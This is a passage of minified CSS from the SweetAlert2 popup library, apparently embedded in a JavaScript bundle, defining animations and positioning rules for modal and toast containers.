swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@-webkit-keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(.4);opacity:0}50%{margin-top:1.625em;transform:scale(.4);opacity:0}80%{margin-top:-.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(.4);opacity:0}50%{margin-top:1.625em;transform:scale(.4);opacity:0}80%{margin-top:-.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@-webkit-keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0);opacity:1}}@keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0);opacity:1}}@-webkit-keyframes swal2-rotate-loading{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}@keyframes swal2-rotate-loading{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow:hidden}body.swal2-height-auto{height:auto!important}body.swal2-no-backdrop .swal2-container{top:auto;right:auto;bottom:auto;left:auto;max-width:calc(100% - .625em * 2);background-color:transparent!important}body.swal2-no-backdrop .swal2-container>.swal2-modal{box-shadow:0 0 10px rgba(0,0,0,.4)}body.swal2-no-backdrop .swal2-container.swal2-top{top:0;left:50%;transform:translateX(-50%)}body.swal2-no-backdrop .swal2-container.swal2-top-left,body.swal2-no-backdrop .swal2-container.swal2-top-start{top:0;left:0}body.swal2-no-backdrop .swal2-container.swal2-top-end,body.swal2-no-backdrop .swal2-container.swal2-top-right{top:0;right:0}body.swal2-no-backdrop .swal2-container.swal2-center{top:50%;left:50%;transform:translate(-50%,-50%)}body.swal2-no-backdrop .swal2-container.swal2-center-left,body.swal2-no-backdrop .swal2-container.swal2-center-start{top:50%;left:0;transform:translateY(-50%)}body.swal2-no-backdrop .swal2-container.swal2-center-end,body.swal2-no-backdrop .swal2-container.swal2-center-right{top:50%;right:0;transform:translateY(-50%)}body.swal2-no-backdrop .swal2-container.swal2-bottom{bottom:0;left:50%;transform:translateX(-50%)}body.swal2-no-backdrop .swal2-container.swal2-bottom-left,body.swal2-no-backdrop .swal2-container.swal2-bottom-start{bottom:0;left:0}body.swal2-no-backdrop .swal2-container.swal2-bottom-end,body.swal2-no-backdrop .swal2-container.swal2-bottom-right{right:0;bottom:0}@media print{body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow-y:scroll!important}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown)>[aria-hidden=true]{display:none}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container{position:static!important}}body.swal2-toast-shown .swal2-container{background-color:transparent}body.swal2-toast-shown .swal2-container.swal2-top{top:0;right:auto;bottom:auto;left:50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-top-end,body.swal2-toast-shown .swal2-container.swal2-top-right{top:0;right:0;bottom:auto;left:auto}body.swal2-toast-shown .swal2-container.swal2-top-left,body.swal2-toast-shown .swal2-container.swal2-top-start{top:0;right:auto;bottom:auto;left:0}body.swal2-toast-shown .swal2-container.swal2-center-left,body.swal2-toast-shown .swal2-container.swal2-center-start{top:50%;right:auto;bottom:auto;left:0;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-center{top:50%;right:auto;bottom:auto;left:50%;transform:translate(-50%,-50%)}body.swal2-toast-shown .swal2-container.swal2-center-end,body.swal2-toast-shown .swal2-container.swal2-center-right{top:50%;right:0;bottom:auto;left:auto;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-left,body.swal2-toast-shown .swal2-container.swal2-bottom-start{top:auto;right:auto;bottom:0;left:0}body.swal2-toast-shown .swal2-container.swal2-bottom{top:auto;right:auto;bottom:0;left:50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-end,body.swal2-toast-shown .swal2-container.swal2-bottom-right{top:auto;right:0;bottom:0;left:auto}body.swal2-toast-column .swal2-toast{flex-direction:column;align-items:stretch}body.swal2-toast-column .swal2-toast .swal2-actions{flex:1;align-self:stretch;height:2.2em;margin-top:.3125em}body.swal2-toast-column .swal2-toast .swal2-loading{justify-content:center}body.swal2-toast-column .swal2-toast .swal2-input{height:2em;margin:.3125em auto;font-size:1em}body.swal2-toast-column .swal2-toast .swal2-validation-message{font-size:1em}");
},{}]},{},[2]);
